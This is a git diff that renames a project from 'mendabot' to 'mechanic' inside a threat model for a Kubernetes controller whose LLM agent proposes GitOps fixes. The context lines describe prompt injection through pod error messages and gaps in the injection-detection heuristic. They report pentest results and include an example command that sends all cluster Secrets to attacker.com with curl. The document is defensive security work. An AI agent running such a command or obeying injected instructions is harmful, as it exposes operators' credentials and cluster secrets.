@@ -1,10 +1,10 @@
-# Threat Model: mendabot
+# Threat Model: mechanic
 
 **Version:** 1.3
 **Date:** 2026-02-26
 **Status:** Authoritative
 
-This document is the single source of truth for mendabot's threat model. It is
+This document is the single source of truth for mechanic's threat model. It is
 input to every security review. If the architecture changes, update this document
 before the next review.
 
@@ -12,7 +12,7 @@ before the next review.
 
 ## 1. System Description
 
-mendabot is a Kubernetes controller that watches cluster resource failures, spawns
+mechanic is a Kubernetes controller that watches cluster resource failures, spawns
 short-lived agent Jobs backed by an LLM (OpenCode), and opens pull requests on a
 GitOps repository with proposed fixes.
 
@@ -20,8 +20,8 @@ GitOps repository with proposed fixes.
 
 | Principal | Identity | Scope |
 |-----------|----------|-------|
-| mendabot-watcher | `ServiceAccount: mendabot-watcher` | Cluster-wide read of resources + pods/jobs in own namespace |
-| mendabot-agent | `ServiceAccount: mendabot-agent` (or `mendabot-agent-ns`) | Cluster-wide read-only (default) or namespace-scoped read-only (opt-in) |
+| mechanic-watcher | `ServiceAccount: mechanic-watcher` | Cluster-wide read of resources + pods/jobs in own namespace |
+| mechanic-agent | `ServiceAccount: mechanic-agent` (or `mechanic-agent-ns`) | Cluster-wide read-only (default) or namespace-scoped read-only (opt-in) |
 
 ---
 
@@ -29,11 +29,11 @@ GitOps repository with proposed fixes.
 
 | Asset | Where It Lives | Sensitivity |
 |-------|----------------|-------------|
-| GitHub App private key | `Secret/github-app` in `mendabot` namespace | CRITICAL — enables minting GitHub tokens for the target repo |
-| LLM API key | `Secret/llm-credentials` in `mendabot` namespace | HIGH — enables LLM API usage at operator's cost |
+| GitHub App private key | `Secret/github-app` in `mechanic` namespace | CRITICAL — enables minting GitHub tokens for the target repo |
+| LLM API key | `Secret/llm-credentials` in `mechanic` namespace | HIGH — enables LLM API usage at operator's cost |
 | Kubernetes Secrets (all namespaces) | etcd cluster-wide | HIGH — may contain credentials for all workloads |
 | GitOps repository | GitHub (external) | HIGH — controls what runs in the cluster |
-| RemediationJob CRDs | etcd, `mendabot` namespace | MEDIUM — control what the agent investigates |
+| RemediationJob CRDs | etcd, `mechanic` namespace | MEDIUM — control what the agent investigates |
 | Agent prompt template | `ConfigMap/opencode-prompt` | MEDIUM — controls agent behaviour |
 | Finding error text | `RemediationJob.Spec.Finding.Errors` | MEDIUM — may contain credential fragments |
 | Watcher logs | stdout/controller-runtime | MEDIUM — may contain redacted (but still identifiable) data |
@@ -47,9 +47,9 @@ GitOps repository with proposed fixes.
 │  CLUSTER BOUNDARY                                               │
 │                                                                 │
 │  ┌──────────────────────────────────────────────────────────┐  │
-│  │  MENDABOT NAMESPACE (trusted)                            │  │
+│  │  MECHANIC NAMESPACE (trusted)                            │  │
 │  │                                                          │  │
-│  │  mendabot-watcher Deployment                             │  │
+│  │  mechanic-watcher Deployment                             │  │
 │  │  RemediationJob CRDs                                     │  │
 │  │  Secret/github-app         ← HIGH VALUE TARGET           │  │
 │  │  Secret/llm-credentials    ← HIGH VALUE TARGET           │  │
@@ -83,7 +83,7 @@ GitOps repository with proposed fixes.
 ```
 
 **Key trust boundaries:**
-1. Cluster boundary — attacker outside the cluster cannot directly interact with mendabot
+1. Cluster boundary — attacker outside the cluster cannot directly interact with mechanic
 2. Namespace boundary — workload namespaces are untrusted input sources
 3. Agent/watcher boundary — the agent is semi-trusted (LLM-driven; may be manipulated)
 4. Init/main container boundary — init container has GitHub App key; main container must not
@@ -136,7 +136,7 @@ instruction and no `kubectl get secret` was executed. P-008 (DetectInjection mis
 from controller dispatch path) has since been remediated. Security-audit finding
 2026-02-24-001 (MEDIUM, Remediated) also confirmed that the prompt injection envelope
 (`=== BEGIN/END FINDING ERRORS ===` delimiters) and HARD RULE 8 were missing from the
-Helm chart's `core.txt` — a regression of STORY_05; remediated in `charts/mendabot/files/prompts/core.txt`.
+Helm chart's `core.txt` — a regression of STORY_05; remediated in `charts/mechanic/files/prompts/core.txt`.
 
 **Residual risk:** LLMs are not immune to sophisticated injection. The detection
 heuristic does not cover novel phrasing (persona-shift, turn-injection, token-boundary
@@ -155,9 +155,9 @@ every tool call executed by the LLM agent via OpenCode's bash tool.
 pod fails with message containing "DATABASE_URL=postgres://user:pass@host/db"
 → PodProvider extracts message → truncate(msg, 500) → domain.RedactSecrets()
 → if regex misses the pattern → stored in RemediationJob.Spec.Finding.Errors
-→ readable by anyone with kubectl get remediationjob in mendabot namespace
+→ readable by anyone with kubectl get remediationjob in mechanic namespace
 → injected as FINDING_ERRORS → appears in agent Job spec
-→ readable by anyone with kubectl get/describe job in mendabot namespace
+→ readable by anyone with kubectl get/describe job in mechanic namespace
 → sent to LLM API (external service)
 ```
 
@@ -248,7 +248,7 @@ No remaining known pattern gaps from the phase03 gap table.
 
 **Mechanism:**
 ```
-agent Job runs with mendabot-agent ClusterRole
+agent Job runs with mechanic-agent ClusterRole
 → ClusterRole grants get/list/watch on ["*"]["*"] including Secrets
 → a prompt injection or LLM error causes:
     kubectl get secret -A -o yaml | curl https://attacker.com -d @-
@@ -283,11 +283,11 @@ prompt injection can exfiltrate Secrets to attacker-controlled infrastructure.
 
 ### AV-04: GitHub App Key Compromise (CRITICAL risk)
 
-**Entry point:** `Secret/github-app` in `mendabot` namespace.
+**Entry point:** `Secret/github-app` in `mechanic` namespace.
 
 **Mechanism:**
 ```
-attacker gains access to mendabot namespace (via compromised watcher pod,
+attacker gains access to mechanic namespace (via compromised watcher pod,
 compromised agent, or RBAC misconfiguration)
 → reads Secret/github-app → obtains GitHub App private key
 → mints arbitrary GitHub App installation tokens
@@ -304,7 +304,7 @@ confirmed absent from main container env vars. `github-app-secret` volume confir
 absent from main container mounts. Token written to `/workspace/github-token` via
 `printf '%s'` (no logging). No findings.
 
-**Residual risk:** Any principal with `get` on the `github-app` Secret in the `mendabot`
+**Residual risk:** Any principal with `get` on the `github-app` Secret in the `mechanic`
 namespace (including the agent itself, under default ClusterRole) can read it.
 
 ---
@@ -325,7 +325,7 @@ LLM (via hallucination or injection) generates a commit that:
 **Controls in place:** Branch protection on target repo (requires human review); HARD RULE 1
 (no direct push to main); HARD RULE 2 (no Secret modification).
 
-**Residual risk:** The control is entirely outside mendabot's codebase — it relies on
+**Residual risk:** The control is entirely outside mechanic's codebase — it relies on
 the target repo's branch protection configuration and human reviewer diligence.
 
 ---
@@ -383,7 +383,7 @@ unaffected).
 
 ### AV-08: RBAC Over-Permission on Watcher (MEDIUM risk)
 
-**Entry point:** `ClusterRole: mendabot-watcher`.
+**Entry point:** `ClusterRole: mechanic-watcher`.
 
 **Mechanism:**
 ```
@@ -396,10 +396,10 @@ watcher has get/list/watch on secrets (cluster-wide via ClusterRole)
 **Controls in place:** ClusterRole is explicitly defined and reviewed.
 
 **Pentest outcome (2026-02-24, phases02+04+10):** Live test confirmed watcher ClusterRole
-still includes `"secrets"` — `kubectl get secret -n kube-system --as=...mendabot-watcher`
+still includes `"secrets"` — `kubectl get secret -n kube-system --as=...mechanic-watcher`
 succeeded (bootstrap tokens, Helm release secrets visible). Root cause: finding
 2026-02-24-002 was remediated in Helm chart source but cluster was never upgraded
-(P-005, HIGH, Chart-fixed/Upgrade-pending). `helm upgrade mendabot charts/mendabot/ -n default --reuse-values`
+(P-005, HIGH, Chart-fixed/Upgrade-pending). `helm upgrade mechanic charts/mechanic/ -n default --reuse-values`
 will apply the fix. Chart source has `"secrets"` removed from ClusterRole resource list.
 
 **Residual risk:** ConfigMap write in ClusterRole — confirmed NOT present (namespace
@@ -421,7 +421,7 @@ attacker with write access to RemediationJob CRDs (e.g., a compromised watcher)
 → same outcome as AV-01 without needing to manipulate pod error messages
 ```
 
-**Controls in place:** Only `mendabot-watcher` SA has create rights on `remediationjobs`.
+**Controls in place:** Only `mechanic-watcher` SA has create rights on `remediationjobs`.
 
 **Pentest outcome (2026-02-24, phase03):** Live exploit executed. Direct `RemediationJob`
 creation with injection payload was accepted by API server and dispatched without
@@ -511,9 +511,9 @@ environment copy, not on the immutable Job-spec value.
 
 **Controls in place (v0.3.18 — defense-in-depth, three independent layers):**
 
-- **Layer 1 — `/mendabot-cfg/dry-run` sentinel file** (PRIMARY, tamper-proof):
+- **Layer 1 — `/mechanic-cfg/dry-run` sentinel file** (PRIMARY, tamper-proof):
   A `dry-run-gate` init container (added by `jobbuilder.Build()` when `DryRun=true`)
-  writes `true` into `/mendabot-cfg/dry-run` (mode `444`) before the main
+  writes `true` into `/mechanic-cfg/dry-run` (mode `444`) before the main
   container starts. The main container mounts that `emptyDir` volume **read-only**
   (`ReadOnly: true`). A read-only volume mount cannot be removed, remounted, or
   written to by any process inside the container — including root (absent
